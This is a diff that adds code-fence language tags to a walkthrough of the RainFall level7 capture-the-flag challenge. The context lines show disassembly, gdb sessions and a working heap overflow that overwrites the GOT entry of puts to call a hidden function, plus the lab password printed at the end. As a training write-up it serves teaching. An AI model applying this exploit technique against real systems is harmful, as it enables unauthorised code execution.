@@ -8,7 +8,7 @@ Before performing any kind of exploitation, we assess the security mitigations i
 
 Check if ASLR is enabled:
 
-```
+```bash
 level7@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
 0
 ```
@@ -19,7 +19,7 @@ A value of 0 means ASLR is disabled, memory addresses will remain consistent acr
 
 Check protections with checksec:
 
-```
+```bash
 level7@RainFall:~$ checksec --file ./level7
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level7
@@ -46,7 +46,7 @@ This section provides a detailed analysis of the disassembled code for the `leve
 
 We start by listing all functions in the binary:
 
-```
+```gdb
 (gdb) info functions
 0x080484f4  m
 0x08048521  main
@@ -60,7 +60,7 @@ We observe only two user-defined functions: `main()` and `m()`. Our analysis wil
 
 ### **Function Prologue and Heap Setup**
 
-```
+```asm
 0x08048521 <+0>:     push   %ebp
 0x08048522 <+1>:     mov    %esp,%ebp
 0x08048524 <+3>:     and    $0xfffffff0,%esp
@@ -74,7 +74,7 @@ We observe only two user-defined functions: `main()` and `m()`. Our analysis wil
 
 ### **Allocate structure A (8 bytes)**
 
-```
+```asm
 0x0804852a <+9>:     movl   $0x8,(%esp)
 0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
 0x08048536 <+21>:    mov    %eax,0x1c(%esp)
@@ -86,7 +86,7 @@ We observe only two user-defined functions: `main()` and `m()`. Our analysis wil
 
 ### **Set A\[0] = 1**
 
-```
+```asm
 0x0804853a <+25>:    mov    0x1c(%esp),%eax
 0x0804853e <+29>:    movl   $0x1,(%eax)
 ```
@@ -96,7 +96,7 @@ We observe only two user-defined functions: `main()` and `m()`. Our analysis wil
 
 ### **Allocate A\[1] (8 bytes)**
 
-```
+```asm
 0x08048544 <+35>:    movl   $0x8,(%esp)
 0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
 0x08048550 <+47>:    mov    %eax,%edx
@@ -112,7 +112,7 @@ We observe only two user-defined functions: `main()` and `m()`. Our analysis wil
 
 ### **Allocate structure B (8 bytes)**
 
-```
+```asm
 0x08048559 <+56>:    movl   $0x8,(%esp)
 0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
 0x08048565 <+68>:    mov    %eax,0x18(%esp)
@@ -124,7 +124,7 @@ We observe only two user-defined functions: `main()` and `m()`. Our analysis wil
 
 ### **Set B\[0] = 2**
 
-```
+```asm
 0x08048569 <+72>:    mov    0x18(%esp),%eax
 0x0804856d <+76>:    movl   $0x2,(%eax)
 ```
@@ -134,7 +134,7 @@ We observe only two user-defined functions: `main()` and `m()`. Our analysis wil
 
 ### **Allocate B\[1] (8 bytes)**
 
-```
+```asm
 0x08048573 <+82>:    movl   $0x8,(%esp)
 0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
 0x0804857f <+94>:    mov    %eax,%edx
@@ -150,7 +150,7 @@ We observe only two user-defined functions: `main()` and `m()`. Our analysis wil
 
 ### **Copy argv\[1] into A\[1] (strcpy)**
 
-```
+```asm
 0x08048588 <+103>:   mov    0xc(%ebp),%eax
 0x0804858b <+106>:   add    $0x4,%eax
 0x0804858e <+109>:   mov    (%eax),%eax
@@ -175,7 +175,7 @@ This is **vulnerable**, no bounds checking is done and may lead to heap overflow
 
 ### **Copy argv\[2] into B\[1] (strcpy)**
 
-```
+```asm
 0x080485a5 <+132>:   mov    0xc(%ebp),%eax
 0x080485a8 <+135>:   add    $0x8,%eax
 0x080485ab <+138>:   mov    (%eax),%eax
@@ -200,7 +200,7 @@ Same issue, unsafe copy.
 
 ### **Read password file and display**
 
-```
+```asm
 0x080485c2 <+161>:   mov    $0x80486e9,%edx
 0x080485c7 <+166>:   mov    $0x80486eb,%eax
 0x080485cc <+171>:   mov    %edx,0x4(%esp)
@@ -214,7 +214,7 @@ Same issue, unsafe copy.
 <+175>: Set first argument (filename).  
 <+178>: Call fopen("/home/user/level8/.pass", "r").  
 
-```
+```asm
 0x080485d8 <+183>:   mov    %eax,0x8(%esp)
 0x080485dc <+187>:   movl   $0x44,0x4(%esp)
 0x080485e4 <+195>:   movl   $0x8049960,(%esp)
@@ -226,7 +226,7 @@ Same issue, unsafe copy.
 <+195>: Set the destination buffer address to 0x8049960.  
 <+202>: Call fgets(buffer, 0x44, file) to read one line from the password file.  
 
-```
+```asm
 0x080485f0 <+207>:   movl   $0x8048703,(%esp)
 0x080485f7 <+214>:   call   0x8048400 <puts@plt>
 ```
@@ -236,7 +236,7 @@ Same issue, unsafe copy.
 
 ### **Function Epilogue**
 
-```
+```asm
 0x080485fc <+219>:   mov    $0x0,%eax
 0x08048601 <+224>:   leave
 0x08048602 <+225>:   ret
@@ -250,7 +250,7 @@ Same issue, unsafe copy.
 
 ## **Disassembly of m()**
 
-```
+```asm
 0x080484f4 <+0>:     push   %ebp
 0x080484f5 <+1>:     mov    %esp,%ebp
 0x080484f7 <+3>:     sub    $0x18,%esp
@@ -260,7 +260,7 @@ Same issue, unsafe copy.
 <+1>: Create a new stack frame.  
 <+3>: Allocate 24 bytes of stack space.  
 
-```
+```asm
 0x080484fa <+6>:     movl   $0x0,(%esp)
 0x08048501 <+13>:    call   0x80483d0 <time@plt>
 ```
@@ -268,7 +268,7 @@ Same issue, unsafe copy.
 <+6>: Push NULL as the argument to time().  
 <+13>: Call time(0) and store the result in eax (current timestamp).  
 
-```
+```asm
 0x08048506 <+18>:    mov    $0x80486e0,%edx
 0x0804850b <+23>:    mov    %eax,0x8(%esp)
 0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
@@ -282,7 +282,7 @@ Same issue, unsafe copy.
 <+35>: Set first argument (format string) in esp.  
 <+38>: Call printf("%s - %d", c, time).  
 
-```
+```asm
 0x0804851f <+43>:    leave
 0x08048520 <+44>:    ret
 ```
@@ -306,7 +306,7 @@ This section documents the dynamic analysis of the level7 binary using GDB. The 
 
 We start by listing the functions defined in the binary:
 
-```
+```gdb
 (gdb) info functions
 0x080484f4 m
 0x08048521 main
@@ -320,7 +320,7 @@ Function `main()` is the program's entry point. The function `m()` is not called
 
 We want to hijack the GOT entry for `puts()`, which is called at the end of `main()`:
 
-```
+```gdb
 (gdb) disas puts
 Dump of assembler code for function puts@plt:
 => 0x08048400 <+0>: jmp *0x8049928
@@ -328,7 +328,7 @@ Dump of assembler code for function puts@plt:
 
 This confirms the GOT entry for `puts()` is:
 
-```
+```gdb
 0x08049928
 ```
 
@@ -340,7 +340,7 @@ Overwriting this pointer will allow us to divert control flow to our target func
 
 We locate the address of the hidden function `m()`:
 
-```
+```gdb
 (gdb) p m
 $1 = {<text variable, no debug info>} 0x080484f4 <m>
 ```
@@ -355,7 +355,7 @@ We analyze the heap layout to understand how an overflow in one structure can co
 
 From the disassembly of `main()`:
 
-```
+```asm
 0x08048536: mov %eax, 0x1c(%esp) ; a = malloc(8)
 0x08048565: mov %eax, 0x18(%esp) ; b = malloc(8)
 ```
@@ -367,14 +367,14 @@ So:
 
 We break before the second `strcpy()` (i.e., before the overflow happens):
 
-```
+```gdb
 (gdb) break *0x080485bd
 (gdb) run AAAA BBBB
 ```
 
 #### Step 4.1 – Recover addresses of `a` and `b`
 
-```
+```gdb
 (gdb) print $esp
 $1 = (void *) 0xbffff6e0
 
@@ -387,7 +387,7 @@ $1 = (void *) 0xbffff6e0
 
 #### Step 4.2 – Dump memory contents of `a` and `b`
 
-```
+```gdb
 (gdb) x/4wx 0x0804a008
 0x804a008: 0x00000001 0x0804a018 0x00000000 0x0804a038
 ```
@@ -401,7 +401,7 @@ Interpretation:
 
 We now **confirm visually** that `b[1]` lives at `0x0804a02c`:
 
-```
+```gdb
 (gdb) x/xw 0x0804a028 + 4
 0x804a02c: 0x0804a038 ← b[1]
 ```
@@ -410,7 +410,7 @@ We now **confirm visually** that `b[1]` lives at `0x0804a02c`:
 
 The overflow starts from the buffer at `a[1] = 0x0804a018`, and reaches `b[1] = 0x0804a02c`.
 
-```
+```gdb
 (gdb) print 0x0804a02c - 0x0804a018
 $2 = 20
 ```
@@ -430,21 +430,21 @@ We now construct the payload:
 
 In Bash:
 
-```
+```bash
 export A=$(python -c 'print("A" * 20 + "\x28\x99\x04\x08")')
 export B=$(python -c 'print("\xf4\x84\x04\x08")')
 ```
 
 To validate this in GDB, set a breakpoint just before the final `puts()` call:
 
-```
+```gdb
 (gdb) break *0x080485f7
 (gdb) run "$A" "$B"
 ```
 
 Then confirm that the GOT entry has been overwritten:
 
-```
+```gdb
 (gdb) x/wx 0x08049928
 0x8049928 <puts@got.plt>:       0x080484f4
 ```
@@ -457,13 +457,13 @@ The GOT entry for `puts()` now points to `m()`.
 
 Run the final exploit:
 
-```
+```bash
 level7@RainFall:~$ ./level7 "$A" "$B"
 ```
 
 Program output:
 
-```
+```bash
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1754492460
 ```
